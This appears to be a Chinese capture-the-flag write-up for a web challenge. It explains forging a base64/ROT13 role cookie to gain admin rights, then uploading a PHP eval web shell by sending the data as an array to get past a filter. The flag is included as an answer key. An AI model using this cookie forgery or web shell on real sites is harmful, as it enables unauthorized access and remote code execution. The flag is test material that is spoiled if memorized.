# who are you

> 分类：Web

## 题目描述

打开页面提示"Sorry. You have no permissions."，Cookie 中 role 字段可伪造（base64 + rot13），上传文件 getshell。

## 考察知识点

- Cookie 伪造（base64 + ROT13）
- 文件上传（file_put_contents 数组绕过过滤）

## 解法

1. 抓包发现 Cookie `role=Zjo1OiJ0aHJmZyI7`，base64 解密得 `f:5:"thrfg";`。
2. `thrfg` 是 `guest` 的 ROT13 编码。把 `admin` ROT13 编码得 `nqzva`，构造 `f:5:"nqzva";` 再 base64 编码：

```
admin → nqzva（rot13）
f:5:"nqzva"; → Zjo1OiJucXp2YSI7（base64）
```

3. 修改 Cookie 后进入上传页面，提示可上传文件名和内容。
4. 直接上传 `filename=1.php&data=<?php ...` 会被过滤 `<`（返回 NoNoNo）。利用 `file_put_contents` 支持数组的特性，用 `data[]=` 绕过正则匹配：

```
filename=1.php&data[]=<?php @eval($_POST['1']);?>
```

5. 访问上传路径直接得到 flag。

## 参考答案

`flag{e07cd440-8eed-11e7-997d-7efc09eb6c59}`

## 来源

- 作者：张伟文 | https://www.cnblogs.com/xyweiwen/p/18133205
- 作者：Pr0ph3t | https://blog.pr0ph3t.com/posts/%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Writeup/
- 作者：烟敛寒林o | https://blog.csdn.net/dyw_666666/article/details/89874060
